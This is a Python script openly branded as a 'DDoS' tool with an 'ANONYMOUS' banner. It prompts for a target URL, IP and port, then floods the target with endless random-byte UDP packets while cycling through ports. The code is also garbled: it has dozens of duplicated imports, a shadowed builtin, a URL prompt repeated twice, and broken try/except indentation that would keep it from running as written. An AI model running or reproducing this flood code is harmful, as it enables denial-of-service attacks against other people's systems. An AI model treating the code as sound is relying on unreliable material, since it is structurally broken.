import socket
import random
import os
import time
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass
from ast import Num
import code
import requests
import socket
from multiprocessing.connection import wait
from operator import contains
from platform import system
import random
from socket import timeout
from time import sleep
import math
from threading import Thread, Timer
import requests
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
import socket, threading
from threading import Thread
import random
import time
import scapy
import colorama
import socket
import threading
import random
import requests
from socket import socket,AF_INET , SOCK_DGRAM,SOCK_STREAM,gaierror
from random import _urandom
from os import system
from sys import exit

#########Terminal colors################
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
default = "\033[0m"

time.sleep(1)
os.system("clear")

os.system("figlet DDoS HTTP")
time.sleep(3)

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.045)

type("""DDos NEW METHOD""")
time.sleep(3)
os.system("clear")

print("""
             __      ANONYMOUS       _____
            / /  __ _ _   _  ___ _  |___  |
           / /  / _` | | | |/ _ \ '__| / /
          / /__| (_| | |_| |  __/ |   / /
          \____/\__,_|\__, |\___|_|  /_/
                      |___/
                 ADDED NEW METHOD 
               DDoS Layer7 (DDoS) 💥
""")
print()
#########################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
#########################################################################
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
time.sleep(2.5)
print("\033[94m")
#########################################################################

fake_ip = '77.109.33.232'




def check_net_con():
  try:
    sock = socket(AF_INET,SOCK_STREAM)
    sock.connect(("www.google.com",80))
  except gaierror:
    print(f"{red} please Check Your Internet Connection {default}")
    exit()
  
######### print banner function ######
def banner():
  global red,blue,green,yellow,white,default
  system("clear" or "cls")
  ####### we will send requests #######
def req_send(ip,port,byte):
  sock = socket(AF_INET,SOCK_DGRAM)
  send = 0
  while True:
    sock.sendto(byte, (ip,port))
    send += 1
    port += 1
    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
    if port == 65534:
      port = 1

if __name__ == "__main__":
  banner()
  check_net_con()
############ we will take input#####
  
#########################################################################
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
time.sleep(2.5)
print("\033[94m")
#########################################################################

try:
    
    ip = input("\033[94m╔═══\033[91m[ Target IP ] •\n\033[94m╠══>\033[0m ")
    port = int(input("\033[94m╠═══\033[91m[ Enter PORT ] •\n\033[94m╠══>\033[0m "))
    if not (ip == "" or port == ""):
      byte = _urandom(1490)
      req_send(ip,port,byte)
    else:
      print(f"{red}IP address and Port number is required {default}")
      exit()
      
  except ValueError:
    print(f"{red}Port number must be int not a str{default}")
    exit()
  except Exception as err:
    print(f"{red}{err}{default}")
    exit()
#print('Atacando porta 💥')

